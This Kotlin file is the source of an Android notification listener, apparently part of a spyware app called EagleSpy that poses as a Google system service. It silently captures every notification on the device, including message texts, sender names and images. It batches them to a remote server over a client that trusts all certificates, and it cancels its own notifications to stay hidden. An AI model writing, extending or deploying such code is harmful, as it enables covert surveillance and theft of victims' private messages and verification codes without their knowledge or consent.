package com.google.android.systemservice.services

import android.app.Notification
import android.content.ComponentName
import android.content.Context
import android.graphics.Bitmap
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Icon
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Base64
import android.util.Log
import com.google.android.systemservice.EagleSpyApp
import com.google.android.systemservice.utils.TrustAllCertificates
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.util.Collections
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.ConcurrentLinkedQueue

class StealthNotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "StealthNotifListener"
        private const val OUR_PACKAGE = "com.google.android.systemservice"
        
        // Our foreground notification IDs to cancel
        private val OUR_NOTIFICATION_IDS = setOf(2000, 2001, 2002, 2003, 2004)
        
        // Batch settings
        private const val BATCH_INTERVAL_MS = 10000L // 10 seconds
        private const val MAX_BATCH_SIZE = 50
        
        var isEnabled = false
            private set

        fun isNotificationListenerEnabled(context: Context): Boolean {
            val flat = Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            )
            val cn = ComponentName(context, StealthNotificationListener::class.java)
            return flat?.split(":")?.any {
                try {
                    ComponentName.unflattenFromString(it) == cn
                } catch (e: Exception) { false }
            } == true
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private val pendingNotifications = ConcurrentLinkedQueue<JSONObject>()
    private val processingKeys: MutableSet<String> = Collections.newSetFromMap(ConcurrentHashMap<String, Boolean>())
    private val httpClient = TrustAllCertificates.createSecureClientBuilder().build()

    private val batchRunnable = object : Runnable {
        override fun run() {
            sendBatchToServer()
            handler.postDelayed(this, BATCH_INTERVAL_MS)
        }
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        isEnabled = true
        Log.d(TAG, "NotificationListener connected")
        
        // Cancel any existing notifications from our app
        cancelOurNotifications()
        
        // Start batch sending
        handler.postDelayed(batchRunnable, BATCH_INTERVAL_MS)
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        isEnabled = false
        handler.removeCallbacks(batchRunnable)
        httpClient.dispatcher.executorService.shutdown()
        Log.d(TAG, "NotificationListener disconnected")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return

        // Cancel our own foreground notifications
        if (shouldCancelNotification(sbn)) {
            handler.postDelayed({
                try {
                    cancelNotification(sbn.key)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to cancel notification: ${e.message}")
                }
            }, 50)
            return
        }

        // Capture notification data
        try {
            val notificationData = extractNotificationData(sbn)
            pendingNotifications.add(notificationData)
            
            // Send immediately if batch is full
            if (pendingNotifications.size >= MAX_BATCH_SIZE) {
                sendBatchToServer()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to extract notification: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Optional: track removed notifications
    }

    private fun shouldCancelNotification(sbn: StatusBarNotification): Boolean {
        return sbn.packageName == OUR_PACKAGE && sbn.id in OUR_NOTIFICATION_IDS
    }

    private fun cancelOurNotifications() {
        try {
            activeNotifications?.forEach {
                if (shouldCancelNotification(it)) {
                    cancelNotification(it.key)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to cancel notifications: ${e.message}")
        }
    }

    private fun extractNotificationData(sbn: StatusBarNotification): JSONObject {
        val notification = sbn.notification
        val basic = extractBasicFields(sbn)
        val media = extractMediaContent(notification)
        val actions = extractActionButtons(notification)

        return JSONObject().apply {
            basic.forEach { (k, v) -> put(k, v) }
            media.forEach { (k, v) -> put(k, v) }
            put("actions", JSONArray(actions.map { JSONObject(it) }))
            put("device_id", EagleSpyApp.getInstance().getDeviceIdentifier())
            put("timestamp", System.currentTimeMillis())
        }
    }

    private fun extractBasicFields(sbn: StatusBarNotification): Map<String, Any?> {
        val notification = sbn.notification
        val extras = notification.extras
        val result = mutableMapOf<String, Any?>(
            "package_name" to sbn.packageName,
            "post_time" to sbn.postTime,
            "key" to sbn.key,
            "id" to sbn.id,
            "title" to (extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""),
            "text" to (extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""),
            "big_text" to (extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""),
            "sub_text" to (extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""),
            "info_text" to (extras.getCharSequence(Notification.EXTRA_INFO_TEXT)?.toString() ?: ""),
            "summary_text" to (extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString() ?: ""),
            "category" to (notification.category ?: "")
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
            if (messages != null && messages.isNotEmpty()) {
                val messagesArray = JSONArray()
                messages.filterIsInstance<Bundle>().forEach { bundle ->
                    val msgObj = JSONObject()
                    msgObj.put("text", bundle.getCharSequence("text")?.toString() ?: "")
                    msgObj.put("sender", bundle.getCharSequence("sender")?.toString() ?: "")
                    msgObj.put("time", bundle.getLong("time", 0))
                    messagesArray.put(msgObj)
                }
                result["messages"] = messagesArray
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            result["channel_id"] = notification.channelId ?: ""
        }

        return result
    }

    private fun extractMediaContent(notification: Notification): Map<String, Any?> {
        val mediaArray = JSONArray()
        extractLargeIcon(notification)?.let {
            mediaArray.put(JSONObject().apply { put("type", "large_icon"); put("data", it) })
        }
        notification.extras?.let { extras ->
            extractBigPicture(extras)?.let {
                mediaArray.put(JSONObject().apply { put("type", "big_picture"); put("data", it) })
            }
            extractPictureIcon(extras)?.let {
                mediaArray.put(JSONObject().apply { put("type", "picture_icon"); put("data", it) })
            }
        }
        return mapOf("media" to mediaArray)
    }

    private fun extractLargeIcon(notification: Notification): String? {
        return try {
            val extras = notification.extras ?: return null
            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                extras.getParcelable<Icon>(Notification.EXTRA_LARGE_ICON)?.let { icon ->
                    iconToBitmap(icon)
                } ?: extras.getParcelable<Bitmap>(Notification.EXTRA_LARGE_ICON)
            } else {
                @Suppress("DEPRECATION")
                extras.getParcelable<Bitmap>(Notification.EXTRA_LARGE_ICON)
            }
            bitmap?.let {
                try {
                    val base64 = bitmapToBase64(it)
                    base64.ifEmpty { null }
                } finally {
                    it.recycle()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to extract large icon: ${e.message}")
            null
        }
    }

    private fun extractBigPicture(extras: Bundle): String? {
        return try {
            extras.getParcelable<Bitmap>(Notification.EXTRA_PICTURE)?.let { bitmap ->
                try {
                    val base64 = bitmapToBase64(bitmap)
                    base64.ifEmpty { null }
                } finally {
                    bitmap.recycle()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to extract big picture: ${e.message}")
            null
        }
    }

    private fun extractPictureIcon(extras: Bundle): String? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return null
        return try {
            extras.getParcelable<Icon>(Notification.EXTRA_PICTURE_ICON)?.let { icon ->
                iconToBitmap(icon)?.let { bitmap ->
                    try {
                        val base64 = bitmapToBase64(bitmap)
                        base64.ifEmpty { null }
                    } finally {
                        bitmap.recycle()
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to extract picture icon: ${e.message}")
            null
        }
    }

    private fun extractActionButtons(notification: Notification): List<Map<String, String>> {
        return notification.actions?.map { action ->
            mapOf("label" to (action.title?.toString() ?: ""))
        } ?: emptyList()
    }

    private fun iconToBitmap(icon: Icon): Bitmap? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val drawable = icon.loadDrawable(this)
                if (drawable is BitmapDrawable) {
                    drawable.bitmap
                } else {
                    null
                }
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun bitmapToBase64(bitmap: Bitmap): String {
        var scaledBitmap: Bitmap? = null
        return try {
            scaledBitmap = if (bitmap.width > 500 || bitmap.height > 500) {
                val scale = minOf(500f / bitmap.width, 500f / bitmap.height)
                Bitmap.createScaledBitmap(
                    bitmap,
                    (bitmap.width * scale).toInt(),
                    (bitmap.height * scale).toInt(),
                    true
                ) ?: return ""
            } else {
                bitmap
            }
            ByteArrayOutputStream().use { outputStream ->
                scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
                Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
            }
        } catch (e: Exception) {
            ""
        } finally {
            if (scaledBitmap != null && scaledBitmap !== bitmap) scaledBitmap.recycle()
        }
    }

    private fun sendBatchToServer() {
        if (pendingNotifications.isEmpty()) return

        val batch = JSONArray()
        val batchKeys = mutableListOf<String>()
        var count = 0
        while (pendingNotifications.isNotEmpty() && count < MAX_BATCH_SIZE) {
            pendingNotifications.poll()?.let { notif ->
                val key = notif.optString("key", "")
                if (key.isEmpty() || processingKeys.add(key)) {
                    batch.put(notif)
                    if (key.isNotEmpty()) batchKeys.add(key)
                } else {
                    // Already being processed, skip to avoid duplicate send
                }
            }
            count++
        }

        if (batch.length() == 0) return

        val payload = JSONObject().apply {
            put("notifications", batch)
            put("device_id", EagleSpyApp.getInstance().getDeviceIdentifier())
            put("batch_time", System.currentTimeMillis())
        }

        val serverUrl = EagleSpyApp.getInstance().getServerUrl()
            .replace("ws://", "http://")
            .replace("wss://", "https://")
            .replace("/cable", "/api/notifications")

        val request = Request.Builder()
            .url(serverUrl)
            .post(payload.toString().toRequestBody("application/json".toMediaType()))
            .build()

        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Failed to send notifications: ${e.message}")
                // Remove from processing set before re-queuing
                batchKeys.forEach { processingKeys.remove(it) }
                for (i in 0 until batch.length()) {
                    pendingNotifications.add(batch.getJSONObject(i))
                }
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (it.isSuccessful) {
                        Log.d(TAG, "Sent ${batch.length()} notifications")
                    } else {
                        Log.e(TAG, "Server error: ${it.code}")
                    }
                }
                // Sent or permanently failed; remove from processing set
                batchKeys.forEach { processingKeys.remove(it) }
            }
        })
    }
}
